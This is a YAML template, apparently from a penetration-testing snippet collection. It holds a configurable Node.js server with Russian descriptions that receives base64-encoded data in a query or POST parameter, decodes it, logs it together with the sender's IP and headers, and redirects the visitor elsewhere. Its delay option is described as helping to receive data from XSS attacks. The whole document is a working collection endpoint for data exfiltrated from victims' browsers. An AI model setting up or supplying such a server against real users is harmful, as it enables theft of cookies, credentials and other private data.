description: |-
  Node.js сервер, декодирующий (base64 / URLencoding+base64) значение указанного параметра и перенаправляющий запрос на заданный URL

author: vinzekatze
tags:
  - node.js
  - redirect
  - server

arguments:
  port:
    default:
    description: порт сервера
    replacer: '#port#'
    regex: '^([1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$'
  n:
    default: number
    description: имя параметра, отвечающего за нумерацию полученных данных
    replacer: '#num-param#'
    metavar: PARAMETER
  p:
    default: payload
    description: имя параметра, данные из которого будут декодированы
    replacer: '#payload-param#'
    metavar: PARAMETER
  i:
    default: '0.0.0.0'
    description: IP старта сервера
    replacer: '#ip#'
    metavar: IP
    regex: '^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$'
  r:
    default: 'https://yandex.ru'
    description: URL сайта для редиректа
    replacer: '#redirect#'
    metavar: URL
  
  d:
    default: '0'
    description: задержка ответа сервера в милисекундах. Полезна для избегания перенаправления при получении данных от XSS с помощью смены location.
    metavar: ms
    replacer: '#delay#'
    regex: '\d+'

  btoa-fix:
    default:
      - 'N'
      - 'Y'
    description: декодировать полученные данные из URL Encoding
    replacer: '#btoa-fix#'

  ssl:
    default:
      - |-
        const proto = 'http';
        const server = http.createServer(logic);
      - |-
        const proto = 'https';
        const options = {
          key: fs.readFileSync(#key#),
          cert: fs.readFileSync(#cert#),
        };
        const server = https.createServer(options, logic);
    replacer: '#sslornot#'
    description: использовать ssl
  
  cert:
    default: server.cert
    description: путь до сертификата .cert
    metavar: 'FILE'
    replacer: '#cert#'
  
  key:
    default: server.key
    description: путь до приватного ключа .key
    metavar: 'FILE'
    replacer: '#key#'
  
  log:
    default:
      -
      - |-
        var logdata = {from_ip: req.socket.remoteAddress,
                    url: req.url,
                    method: req.method,
                    date: Date(),
                    headers: req.headers,
                    body: body};
          console.log(logdata);
          console.log();
    description: показывать полный лог
    replacer: '#logging#'  

mode:
  format:
    i: '{0!r}'
    r: '{0!r}'
    cert: '{0!r}'
    key: '{0!r}'
  replace:
    btoa-fix:
      N: >-
        buff.toString('ascii')
      Y: >-
        decodeURIComponent(buff.toString('ascii'))

shell: node
script: |-
  const qs = require('querystring');
  const http = require('http');
  const https = require('https');
  const fs = require('fs');
  const url = require('url');
  const hostname = #ip#
  const port = #port#
  const redirect = #redirect#
  const delay = #delay#

  function logic (req, res) {
    var body = '';
    req.on('data', function(data) {
      body += data;
    });
    req.on('end', function() {
      url_parts = url.parse(req.url, true);
      query = url_parts.query;
      param_data = query.#payload-param#;
      param_data_post = qs.parse(body).#payload-param#;
      
      if (typeof param_data_post !== "undefined") {
        buff = Buffer.from(param_data_post, 'base64');
        console.log(`POST data received from ${req.socket.remoteAddress}:\n${#btoa-fix#}`);
        console.log();
      };
      if (typeof param_data !== "undefined") {
        buff = Buffer.from(param_data, 'base64')
        num = query.#num-param# ?? 0
        console.log(`GET data part ${num} received from ${req.socket.remoteAddress}:\n${#btoa-fix#}`);
        console.log();
      };
      res.writeHeader(302, { 'Location': redirect});
      setTimeout(() => {res.end()}, delay);
      #logging#
    });
  };

  #sslornot#
  server.listen(port, hostname, () => {
    console.log(`Server running at ${proto}://${hostname}:${port}/`);
    console.log();
    console.log(`Redirect URL: ${redirect}`);
    console.log(`Parameter:    #payload-param#`);
    console.log(`Decoding:     base64`);
    console.log();
  })